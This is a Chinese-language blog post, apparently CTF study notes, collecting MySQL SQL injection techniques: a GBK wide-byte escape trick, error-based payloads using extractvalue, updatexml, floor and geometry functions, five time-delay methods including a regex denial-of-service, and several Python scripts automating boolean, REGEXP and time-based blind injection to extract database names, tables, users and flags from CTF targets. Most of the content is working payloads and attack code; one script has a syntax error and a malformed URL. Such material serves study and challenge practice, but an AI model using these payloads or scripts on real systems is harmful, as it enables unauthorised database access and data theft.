+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>条件：mysql数据库编码为gbk,且 <code>&#39;</code> 被转义成 <code>\&#39;</code></p>
+<p>注入：使用 <code>id=%df%27</code></p>
+<p>原理：这里的 <code>%27</code>会被变成 <code>\%27</code> 即 <code>%5c%27</code>，再加上前边的 <code>%df</code> 变成 <code>%df%5c%27</code>，而 <code>%df%5c</code> 在gbk字符集中表示汉子： 運，故语句便成 <code>id=運&#39;</code>，成功逃逸出单引号转义(php中通常是addslashes函数，或开启GPC，PHP5.4版本已移除GPC)</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>floor</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
+
+<p>extractvalue</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure>
+
+<p>updatexml</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>
+
+<p>geometrycollection</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p>multipoint</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p>polygon</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p>multipolygon</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p>linestring</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p>multilinestring</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="五种延时注入"><a href="#五种延时注入" class="headerlink" title="五种延时注入"></a>五种延时注入</h1><p>一、sleep：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sleep(5);</span><br></pre></td></tr></table></figure>
+
+<p>二、benchmark：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select benchmark(10000000,md5(1));</span><br></pre></td></tr></table></figure>
+
+<p>三、笛卡尔积：</p>
+<p>利用 <code>and短路运算规则</code> 进行时间盲注</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row in set (2.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">Empty set (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>四、get_clock共享锁：</p>
+<p>两个session进行操作</p>
+<p>SESSION A</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#39;lihuaiqiu&#39;,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>SESSION B</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,5);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#39;lihuaiqiu&#39;,5) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (5.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;1 and  get_lock(&#39;lihuaiqiu&#39;,2);</span><br><span class="line">Empty set (2.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;0 and  get_lock(&#39;lihuaiqiu&#39;,2);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>五、正则dos，rlike：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;s&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,1);</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;r&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd&#39;,1);</span><br><span class="line">Empty set (3.83 sec)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;121.43.141.153:60056&#x2F;error.php?code&#x3D;&quot;</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">i &#x3D; 0</span><br><span class="line">while (True):</span><br><span class="line">    i &#x3D; i + 1</span><br><span class="line">    head &#x3D; 32</span><br><span class="line">    tail &#x3D; 127</span><br><span class="line">    while (head &lt; tail):</span><br><span class="line">        mid &#x3D; (head + tail) &gt;&gt; 1</span><br><span class="line">        #payload &#x3D; &quot;if(ascii(substr(database(),%d,1))&gt;%d,404,403)&quot; % (i , mid)</span><br><span class="line">        #payload &#x3D; &quot;if(ascii(substr((select group_concat(table_name)from(information_schema.tables)where(table_schema&#x3D;database())),%d,1))&gt;%d,1,0)&quot; % (i,mid)</span><br><span class="line">        #payload &#x3D; &quot;if(ascii(substr((select group_concat(column_name)from(information_schema.columns)where(table_name like &#39;flag&#39;)),%d,1))&gt;%d,404,403)&quot; % (i,mid)</span><br><span class="line">        payload &#x3D; &quot;if(ascii(substr((select flag from fllllllllaaaaaag),%d,1))&gt;%d,404,403)&quot; % (i,mid)</span><br><span class="line">        r &#x3D; requests.get(url + payload)</span><br><span class="line">        </span><br><span class="line">        if &quot;404&quot; in r.text:</span><br><span class="line">            head &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            # print(r.text)</span><br><span class="line">            tail &#x3D; mid</span><br><span class="line">    last &#x3D; result</span><br><span class="line">    if head !&#x3D; 32:</span><br><span class="line">        result +&#x3D; chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+
+<p>没有 union substr mid sleep</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;xxx&#x2F;index.php?act&#x3D;search&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1,60):</span><br><span class="line">    right &#x3D; 127</span><br><span class="line">    left &#x3D; 32</span><br><span class="line">    while left &lt; right:</span><br><span class="line">        mid &#x3D; (left + right)&#x2F;&#x2F;2</span><br><span class="line">        paylaod &#x3D; &#123;</span><br><span class="line">        &quot;keyword&quot;:f&quot;aoliao%&#39;and\&quot;1\&quot;&#x3D;if(ord(right((select(group_concat(flag))from(flag)),&#123;i&#125;))&gt;&#123;mid&#125;,1,0)#&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        a &#x3D; requests.post(url,data&#x3D;paylaod).text</span><br><span class="line">        if &quot;ID:724&quot; in a:</span><br><span class="line">            left &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            right &#x3D; mid</span><br><span class="line">    flag &#x3D; chr(right) + flag</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="REGEXP盲注"><a href="#REGEXP盲注" class="headerlink" title="REGEXP盲注"></a>REGEXP盲注</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">strs &#x3D; string.printable</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;x.x.x.x:8001&#x2F;Less-8&#x2F;index.php?id&#x3D;&quot;</span><br><span class="line"></span><br><span class="line">database1 &#x3D; &quot;&#39; or database() regexp &#39;^&#123;&#125;&#39;--+&quot;</span><br><span class="line">table1 &#x3D; &quot;&#39; or (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) regexp &#39;^&#123;&#125;&#39;--+&quot;</span><br><span class="line">cloumn1 &#x3D; &quot;&#39; or (select column_name from information_schema.columns where table_name&#x3D;\&quot;users\&quot; and table_schema&#x3D;database() limit 1,1) regexp &#39;^&#123;&#125;&#39;--+&quot;</span><br><span class="line">data1 &#x3D; &quot;&#39; or (select username from users limit 0,1) regexp &#39;^&#123;&#125;&#39;--+&quot;</span><br><span class="line"></span><br><span class="line">payload &#x3D; database1</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for i in range(1,40):</span><br><span class="line">        char &#x3D; &#39;&#39;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads &#x3D; payload.format(name+j)</span><br><span class="line">            urls &#x3D; url+payloads</span><br><span class="line">            r &#x3D; requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name +&#x3D; j</span><br><span class="line">                print(j,end&#x3D;&#39;&#39;)</span><br><span class="line">                char &#x3D; j</span><br><span class="line">                break</span><br><span class="line">        if char &#x3D;&#x3D;&#39;#&#39;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;f2b0d8e1-e12f-446c-a90e-bc79e2c0a062.node4.buuoj.cn:81&#x2F;index.php&quot;</span><br><span class="line">asc &#x3D; &#39;Dabcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-_&#39;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(50):</span><br><span class="line">    for j in asc:</span><br><span class="line">        #payload &#x3D; &quot;&#39;or(if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flaggg&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;,benchmark(1000000,md5(1)),0))or&#39;&quot;</span><br><span class="line">        payload &#x3D; &quot;&#39;or(if(ascii(mid((select(cmd)from(flaggg)),&#123;&#125;,1))&#x3D;&#123;&#125;,benchmark(2000000,md5(1)),0))or&#39;&quot;</span><br><span class="line">        data &#x3D; &#123;&quot;username&quot;: payload.format(i, ord(j)),&quot;password&quot;: &quot;test&quot;&#125;</span><br><span class="line">        start_time2&#x3D;time.time()</span><br><span class="line">        res &#x3D; requests.post(url, data&#x3D;data)</span><br><span class="line">        end_time2&#x3D;time.time()</span><br><span class="line">        sec2&#x3D;(end_time2-start_time2)</span><br><span class="line">        if sec2 &gt;&#x3D;0.4</span><br><span class="line">            flag +&#x3D; j</span><br><span class="line">            print(flag)</span><br><span class="line">            time.sleep(0.3)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#sys.schema_table_statistics </span><br><span class="line">#sys.x$statement_analysis Fl49ish3re.f1aG123</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for a in range(1,9999):</span><br><span class="line">    print(a)</span><br><span class="line">    for i in range(30,130):</span><br><span class="line">        payload&#x3D;(&quot;&#39; or if((select STRCMP(hex(right((select (f1aG123) from Fl49ish3re),&quot;+str(a)+&quot;)),&#39;&quot;+str(hex(i))[2:]+flag+&quot;&#39;)),1,benchmark(9999999,md5(&#39;test&#39;)))#&quot;).replace(&quot; &quot;,&quot;&#x2F;**&#x2F;&quot;)</span><br><span class="line">        try:</span><br><span class="line">            #UPDATE &#96;Fl49ish3re&#96; SET &#96;f1aG123&#96; &#x3D; ? WHERE &#96;f1aG123&#96; &#x3D; ?</span><br><span class="line">            #Fl49ish3re</span><br><span class="line">            #users,Fl49ish3re</span><br><span class="line">            r&#x3D;requests.post(url&#x3D;&quot;&lt;http:&#x2F;&#x2F;172.52.31.84&#x2F;index.php&quot;,data&#x3D;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&gt;&quot;:payload&#125;,timeout&#x3D;1)</span><br><span class="line">            #print(r.text)</span><br><span class="line">        except:</span><br><span class="line">            flag&#x3D;str(hex(i))[2:]+flag</span><br><span class="line">            print(payload)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/">Sql注入备忘录</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5505">https://xz.aliyun.com/t/5505</a></p>
+<p><a target="_blank" rel="noopener" href="https://k1te.cn/2021/05/19/no-column-sql-injection/">ctf无列名注入小结</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/25/nitai/" rel="prev" title="强网拟态 2022">
+                  <i class="fa fa-angle-left"></i> 强网拟态 2022
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/25/RMI-attack/" rel="next" title="RMI反序列化初探">
+                  RMI反序列化初探 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
